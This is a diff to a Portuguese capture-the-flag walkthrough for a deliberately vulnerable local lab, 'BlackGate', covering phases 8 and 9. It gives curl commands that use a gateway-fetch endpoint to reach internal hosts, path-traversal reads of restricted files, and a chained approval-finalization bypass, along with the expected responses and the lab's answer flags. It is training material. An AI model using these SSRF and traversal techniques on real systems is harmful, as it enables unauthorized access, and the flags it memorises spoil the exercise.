@@ -1,6 +1,6 @@
-# Lab 05 - BlackGate - Walkthrough da Fase 8
+# Lab 05 - BlackGate - Walkthrough da Fase 9
 
-Este walkthrough cobre a **Fase 8 - Maintenance Worker Processing Abuse** do Lab 05. A aplicacao mantem as fases anteriores e adiciona processamento inseguro simulado no maintenance worker de `legacy-panel.internal`.
+Este walkthrough cobre a **Fase 9 - Final Admin Approval / Boss Flag** do Lab 05. A aplicacao mantem as fases anteriores e adiciona o fluxo final de aprovacao administrativa simulada em `legacy-panel.internal`.
 
 Tudo continua seguro e local: nao ha request real para internet, banco externo, shell, upload, Redis, worker separado, filesystem real ou command injection real.
 
@@ -30,11 +30,11 @@ Resultado esperado:
 {
   "service": "blackgate",
   "status": "ok",
-  "version": "1.7.0-phase8"
+  "version": "1.8.0-phase9"
 }
 ```
 
-`/api/version` deve retornar build `bg-phase8-worker-processing`.
+`/api/version` deve retornar build `bg-phase9-final-approval`.
 
 ## Login e contexto operator
 
@@ -133,8 +133,6 @@ FLAG{blackgate_legacy_credential_reuse_phase6}
 
 ## Criar o job da Fase 7
 
-Crie o job aceito pelo workflow de reports:
-
 ```bash
 CREATE_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only"))')
 
@@ -143,223 +141,19 @@ curl -i -b /tmp/bg-cookie.txt \
   "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_JOB"
 ```
 
-Resposta esperada:
+Flag esperada:
 
 ```text
 FLAG{blackgate_report_workflow_abuse_phase7}
 ```
 
-O job relevante:
+Job relevante:
 
 ```text
 bg7-job-worker-diagnostics
 ```
 
-## Consultar worker status
-
-```bash
-WORKER_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/status?session=bg6-legacy-session-migration"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS"
-```
-
-Resultado esperado:
-
-```json
-{
-  "service": "legacy-panel",
-  "worker": "maintenance-worker",
-  "status": "paused",
-  "mode": "migration-review",
-  "accepts": ["queued diagnostics jobs"],
-  "blocked": ["external callbacks", "shell execution", "synchronous render"]
-}
-```
-
-## Consultar worker queue
-
-```bash
-WORKER_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/queue?session=bg6-legacy-session-migration"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_QUEUE"
-```
-
-Resultado esperado:
-
-```json
-{
-  "queue": "maintenance-worker",
-  "status": "review",
-  "jobs": [
-    {
-      "job_id": "bg7-job-worker-diagnostics",
-      "template": "worker-diagnostics",
-      "status": "queued",
-      "processor": "maintenance-worker"
-    }
-  ]
-}
-```
-
-## Consultar detalhes do job
-
-```bash
-WORKER_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/jobs/bg7-job-worker-diagnostics?session=bg6-legacy-session-migration"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_JOB"
-```
-
-Observe:
-
-- `template: worker-diagnostics`;
-- `queue: maintenance-worker`;
-- `diagnostics.profile: migration-safe`;
-- `allowed_actions: status, checksum, trace`;
-- `blocked_actions: exec, callback, shell`;
-- `review_note` apontando para validacao no processor.
-
-## Ler arquivos restritos da Fase 8
-
-Use o mesmo bypass controlado do Files Vault:
-
-```bash
-WORKER_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/worker-review.txt"))')
-DIAG_ACTIONS=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/diagnostics-actions.txt"))')
-PROCESSOR_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/processor-notes.txt"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_REVIEW"
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$DIAG_ACTIONS"
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$PROCESSOR_NOTES"
-```
-
-Pontos importantes:
-
-- o processor aceita jobs `worker-diagnostics` enfileirados;
-- metadados de review ficam fora do seletor publico;
-- algumas acoes sao validadas por prefixo;
-- a fila elegivel e `maintenance-worker`;
-- existe uma pista fragmentada para `trace:internal:queue`.
-
-## Diagnostics
-
-```bash
-WORKER_DIAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/diagnostics?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_DIAG"
-```
-
-Resultado esperado:
-
-```json
-{
-  "job": "bg7-job-worker-diagnostics",
-  "profile": "migration-safe",
-  "actions": ["status", "checksum", "trace"],
-  "note": "Extended trace actions require review metadata."
-}
-```
-
-Profile interno:
-
-```bash
-WORKER_DIAG_INTERNAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/diagnostics?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&profile=internal"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_DIAG_INTERNAL"
-```
-
-Resultado esperado: `profile_restricted`.
-
-## Testar actions decoy
-
-Status:
-
-```bash
-WORKER_STATUS_ACTION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=status&review=1"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS_ACTION"
-```
-
-Checksum:
-
-```bash
-WORKER_CHECKSUM=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=checksum&review=1"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_CHECKSUM"
-```
-
-Trace basico:
-
-```bash
-WORKER_TRACE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace&review=1"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_TRACE"
-```
-
-Essas respostas nao retornam flag.
-
-Trace interno sem queue:
-
-```bash
-WORKER_TRACE_INTERNAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal&review=1"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_TRACE_INTERNAL"
-```
-
-Resultado esperado: `review_only`, sem flag.
-
-Acao bloqueada:
-
-```bash
-WORKER_BLOCK=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=exec&review=1"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_BLOCK"
-```
-
-Resultado esperado: `blocked_action`.
-
-Sem review:
-
-```bash
-WORKER_NO_REVIEW=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue"))')
-
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_NO_REVIEW"
-```
-
-Resultado esperado: `review_required`.
-
-## Obter a flag da Fase 8
-
-O abuso controlado e a acao de trace interno da fila passando por validacao fraca de prefixo:
+## Processar o trace da Fase 8
 
 ```bash
 WORKER_FLAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue&review=1"))')
@@ -369,22 +163,225 @@ curl -i -b /tmp/bg-cookie.txt \
   "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_FLAG"
 ```
 
+Flag esperada:
+
+```text
+FLAG{blackgate_worker_processing_abuse_phase8}
+```
+
+Campos importantes para a Fase 9:
+
+```text
+review_id: BG-REV-9041
+trace_marker: qtrace-9041
+queue_ref: maintenance-worker:bg7-job-worker-diagnostics
+```
+
+## Ler arquivos restritos da Fase 9
+
+Use o mesmo bypass controlado do Files Vault:
+
+```bash
+FINAL_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/final-review-notes.txt"))')
+APPROVAL_RECON=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/approval-reconciliation.txt"))')
+APPROVAL_POLICY=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/admin-approval-policy.txt"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_NOTES"
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_RECON"
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_POLICY"
+```
+
+Pontos importantes:
+
+- approval e reconciliado depois de queue traces;
+- review IDs se ligam a trace markers;
+- `queue_ref` usa formato `<queue>:<job_id>`;
+- public admin role nao e suficiente;
+- maintenance-originated reviews podem chegar na finalizacao quando os dados batem.
+
+## Approval base e status
+
+```bash
+APPROVAL_HOME=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_HOME"
+```
+
+Sem review:
+
+```bash
+APPROVAL_STATUS_GENERIC=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_STATUS_GENERIC"
+```
+
+Com review correto:
+
+```bash
+APPROVAL_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_STATUS"
+```
+
+Resultado esperado:
+
+```json
+{
+  "review_id": "BG-REV-9041",
+  "state": "pending-admin",
+  "queue_ref": "maintenance-worker:bg7-job-worker-diagnostics",
+  "trace_marker_required": true,
+  "finalizable": false
+}
+```
+
+Audit limitado:
+
+```bash
+APPROVAL_AUDIT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/audit?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_AUDIT"
+```
+
+Sem flag.
+
+## Decoys de reconciliation
+
+Review errado:
+
+```bash
+RECON_BAD_REVIEW=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-0000&trace_marker=qtrace-9041&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_REVIEW"
+```
+
+Trace errado:
+
+```bash
+RECON_BAD_TRACE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-0000&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_TRACE"
+```
+
+Queue errada:
+
+```bash
+RECON_BAD_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-9041&queue_ref=wrong"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_QUEUE"
+```
+
+Resultados esperados: `review_not_found`, `invalid_trace_marker` e `invalid_queue_ref`.
+
+## Reconcile correto
+
+```bash
+RECONCILE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-9041&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$RECONCILE"
+```
+
+Resultado esperado:
+
+```json
+{
+  "service": "legacy-panel",
+  "module": "approval",
+  "review_id": "BG-REV-9041",
+  "state": "reconciled",
+  "reconciliation_token": "bg9-reconciled-BG-REV-9041",
+  "note": "Reconciled maintenance reviews can be submitted to final approval."
+}
+```
+
+## Decoys de finalizer
+
+Finalizer admin:
+
+```bash
+FINAL_ADMIN=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=admin"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_ADMIN"
+```
+
+Resultado esperado: `public_admin_rejected`.
+
+Finalizer operator:
+
+```bash
+FINAL_OPERATOR=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=operator"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_OPERATOR"
+```
+
+Resultado esperado: `operator_finalizer_rejected`.
+
+Token errado:
+
+```bash
+FINAL_BAD_TOKEN=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bad&finalizer=maintenance"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_BAD_TOKEN"
+```
+
+Resultado esperado: `invalid_reconciliation_token`.
+
+## Obter a flag final
+
+```bash
+FINAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=maintenance"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL"
+```
+
 Resposta esperada:
 
 ```json
 {
   "service": "legacy-panel",
-  "worker": "maintenance-worker",
-  "job": "bg7-job-worker-diagnostics",
-  "action": "trace:internal:queue",
-  "processed": true,
-  "finding": "worker diagnostics action accepted internal queue trace through weak prefix validation",
-  "flag": "FLAG{blackgate_worker_processing_abuse_phase8}",
-  "next_hint": "Final review requires correlating queue output with admin approval state."
+  "module": "approval",
+  "review_id": "BG-REV-9041",
+  "state": "finalized",
+  "finalizer": "maintenance",
+  "finding": "admin approval finalization trusted reconciled maintenance state",
+  "flag": "FLAG{blackgate_final_admin_approval_boss_chain}",
+  "complete": true
 }
 ```
 
-## Flags confirmadas ate esta fase
+## Flags confirmadas do Lab 5
 
 ```text
 FLAG{blackgate_weak_token_role_escalation_phase3}
@@ -393,8 +390,9 @@ FLAG{blackgate_files_vault_controlled_read_phase5}
 FLAG{blackgate_legacy_credential_reuse_phase6}
 FLAG{blackgate_report_workflow_abuse_phase7}
 FLAG{blackgate_worker_processing_abuse_phase8}
+FLAG{blackgate_final_admin_approval_boss_chain}
 ```
 
-## O que fica para a proxima fase
+## Encerramento
 
-A Fase 9 deve correlacionar a saida do worker com estado de aprovacao admin para chegar na flag final do Lab 5. Isso ainda nao existe nesta fase.
+A Fase 9 fecha o Lab 5 com uma cadeia completa de contexto fraco, gateway trust, file read controlado, credential reuse, workflow abuse, worker processing abuse e final approval bypass simulado.
